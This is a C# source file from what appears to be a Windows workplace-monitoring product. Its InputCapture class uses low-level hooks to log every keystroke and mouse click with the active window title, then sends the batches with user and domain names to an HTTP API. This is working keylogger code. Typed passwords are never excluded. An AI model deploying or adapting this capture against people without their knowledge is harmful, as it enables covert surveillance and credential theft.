using System.Collections.Concurrent;
using System.Net.Http.Json;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

namespace ADS.WindowsAuth.Core.Services;

/// <summary>
/// Прихваща клавиши и кликове чрез Windows low-level hooks и изпраща batch към API.
/// Работи само в потребителска сесия (не в Session 0). Monitor го стартира чрез RemoteDesktopHost.
/// </summary>
public class InputCapture : IDisposable
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WH_MOUSE_LL = 14;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;
    private const int WM_LBUTTONDOWN = 0x0201;
    private const int WM_RBUTTONDOWN = 0x0204;

    private readonly ConcurrentQueue<InputLogItem> _queue = new();
    private readonly HttpClient _httpClient;
    private readonly string _machineName;
    private readonly Func<string> _getUsername;
    private readonly Func<string> _getDomain;
    private readonly ILoggerService? _logger;
    private readonly int _batchSize = 50;
    private readonly TimeSpan _flushInterval = TimeSpan.FromSeconds(15);
    private Thread? _hookThread;
    private volatile bool _running;
    private DateTime _lastFlush = DateTime.UtcNow;
    private IntPtr _keyboardHookId = IntPtr.Zero;
    private IntPtr _mouseHookId = IntPtr.Zero;

    #region P/Invoke

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string? lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

    #endregion

    public InputCapture(
        HttpClient httpClient,
        string machineName,
        Func<string> getUsername,
        Func<string> getDomain,
        ILoggerService? logger)
    {
        _httpClient = httpClient;
        _machineName = machineName;
        _getUsername = getUsername;
        _getDomain = getDomain;
        _logger = logger;
    }

    public void Start()
    {
        if (_running) return;
        _running = true;
        _hookThread = new Thread(RunHooks) { IsBackground = true };
        _hookThread.SetApartmentState(ApartmentState.STA);
        _hookThread.Start();
        _logger?.LogInfo("InputCapture: стартиран (клавиши + кликове)");
    }

    public void Stop()
    {
        _running = false;
        Flush();
        if (_keyboardHookId != IntPtr.Zero)
        {
            UnhookWindowsHookEx(_keyboardHookId);
            _keyboardHookId = IntPtr.Zero;
        }
        if (_mouseHookId != IntPtr.Zero)
        {
            UnhookWindowsHookEx(_mouseHookId);
            _mouseHookId = IntPtr.Zero;
        }
    }

    private void RunHooks()
    {
        try
        {
            using var curProcess = Process.GetCurrentProcess();
            using var curModule = curProcess.MainModule;
            var modName = curModule?.ModuleName ?? "ADS.WindowsAuth.RemoteDesktopHost.exe";
            var hMod = GetModuleHandle(modName);
            if (hMod == IntPtr.Zero)
                hMod = GetModuleHandle(null);

            var keyProc = new LowLevelKeyboardProc(KeyboardHookCallback);
            var mouseProc = new LowLevelMouseProc(MouseHookCallback);
            _keyboardHookId = SetWindowsHookEx(WH_KEYBOARD_LL, keyProc, hMod, 0);
            _mouseHookId = SetWindowsHookEx(WH_MOUSE_LL, mouseProc, hMod, 0);

            if (_keyboardHookId == IntPtr.Zero || _mouseHookId == IntPtr.Zero)
            {
                _logger?.LogError($"InputCapture: SetWindowsHookEx failed. Keyboard={_keyboardHookId}, Mouse={_mouseHookId}");
                return;
            }

            while (_running)
            {
                Thread.Sleep(500);
                if (_queue.Count >= _batchSize || (DateTime.UtcNow - _lastFlush) > _flushInterval)
                    Flush();
            }
        }
        catch (Exception ex)
        {
            _logger?.LogError($"InputCapture: {ex.Message}", ex);
        }
    }

    private IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
        {
            try
            {
                int vkCode = Marshal.ReadInt32(lParam);
                var (appName, windowTitle) = GetForegroundWindowInfo();
                var keyStr = KeyCodeToString(vkCode);
                _queue.Enqueue(new InputLogItem
                {
                    LogType = "Key",
                    ApplicationName = appName,
                    WindowTitle = windowTitle,
                    Data = keyStr,
                    Timestamp = DateTime.UtcNow,
                    IsPassword = false
                });
            }
            catch { /* ignore */ }
        }
        return CallNextHookEx(_keyboardHookId, nCode, wParam, lParam);
    }

    private IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == (IntPtr)WM_LBUTTONDOWN || wParam == (IntPtr)WM_RBUTTONDOWN))
        {
            try
            {
                var ms = Marshal.PtrToStructure<MSLLHOOKSTRUCT>(lParam);
                var (appName, windowTitle) = GetForegroundWindowInfo();
                var button = wParam == (IntPtr)WM_RBUTTONDOWN ? "Right" : "Left";
                _queue.Enqueue(new InputLogItem
                {
                    LogType = "Click",
                    ApplicationName = appName,
                    WindowTitle = windowTitle,
                    Data = $"{ms.pt.x},{ms.pt.y},{button}",
                    Timestamp = DateTime.UtcNow,
                    IsPassword = false
                });
            }
            catch { /* ignore */ }
        }
        return CallNextHookEx(_mouseHookId, nCode, wParam, lParam);
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct POINT { public int x; public int y; }

    [StructLayout(LayoutKind.Sequential)]
    private struct MSLLHOOKSTRUCT
    {
        public POINT pt;
        public uint mouseData;
        public uint flags;
        public uint time;
        public IntPtr dwExtraInfo;
    }

    private static (string? appName, string? windowTitle) GetForegroundWindowInfo()
    {
        try
        {
            var hwnd = GetForegroundWindow();
            if (hwnd == IntPtr.Zero) return (null, null);
            var sb = new StringBuilder(1024);
            GetWindowText(hwnd, sb, sb.Capacity);
            var title = sb.ToString().Trim();
            if (string.IsNullOrEmpty(title)) title = null;
            if (GetWindowThreadProcessId(hwnd, out uint pid) != 0 && pid != 0)
            {
                try
                {
                    using var p = Process.GetProcessById((int)pid);
                    return (p.ProcessName, title);
                }
                catch { return (null, title); }
            }
            return (null, title);
        }
        catch { return (null, null); }
    }

    private static string KeyCodeToString(int vkCode)
    {
        if (vkCode >= 32 && vkCode <= 126)
            return ((char)vkCode).ToString();
        return vkCode switch
        {
            8 => "[Backspace]",
            9 => "[Tab]",
            13 => "[Enter]",
            19 => "[Pause]",
            20 => "[CapsLock]",
            27 => "[Esc]",
            32 => " ",
            33 => "[PageUp]",
            34 => "[PageDown]",
            35 => "[End]",
            36 => "[Home]",
            37 => "[Left]",
            38 => "[Up]",
            39 => "[Right]",
            40 => "[Down]",
            45 => "[Insert]",
            46 => "[Delete]",
            112 => "[F1]", 113 => "[F2]", 114 => "[F3]", 115 => "[F4]", 116 => "[F5]",
            117 => "[F6]", 118 => "[F7]", 119 => "[F8]", 120 => "[F9]", 121 => "[F10]",
            122 => "[F11]", 123 => "[F12]",
            _ => $"[VK{vkCode}]"
        };
    }

    private void Flush()
    {
        var list = new List<InputLogItem>();
        while (_queue.TryDequeue(out var item) && list.Count < 500)
            list.Add(item);
        if (list.Count == 0) { _lastFlush = DateTime.UtcNow; return; }

        try
        {
            if (_httpClient.BaseAddress == null) return;
            var payload = new
            {
                MachineName = _machineName,
                Username = _getUsername(),
                Domain = _getDomain(),
                Items = list.Select(i => new
                {
                    i.LogType,
                    i.ApplicationName,
                    i.WindowTitle,
                    i.Data,
                    i.Timestamp,
                    i.IsPassword
                }).ToList()
            };
            var response = _httpClient.PostAsJsonAsync("/api/logs/input", payload).GetAwaiter().GetResult();
            if (!response.IsSuccessStatusCode)
                _logger?.LogWarning($"InputCapture: API върна {response.StatusCode}");
        }
        catch (Exception ex)
        {
            _logger?.LogWarning($"InputCapture: грешка при изпращане: {ex.Message}");
            foreach (var item in list)
                _queue.Enqueue(item);
        }
        _lastFlush = DateTime.UtcNow;
    }

    public void Dispose() => Stop();

    private class InputLogItem
    {
        public string LogType { get; set; } = "";
        public string? ApplicationName { get; set; }
        public string? WindowTitle { get; set; }
        public string Data { get; set; } = "";
        public DateTime Timestamp { get; set; }
        public bool IsPassword { get; set; }
    }
}
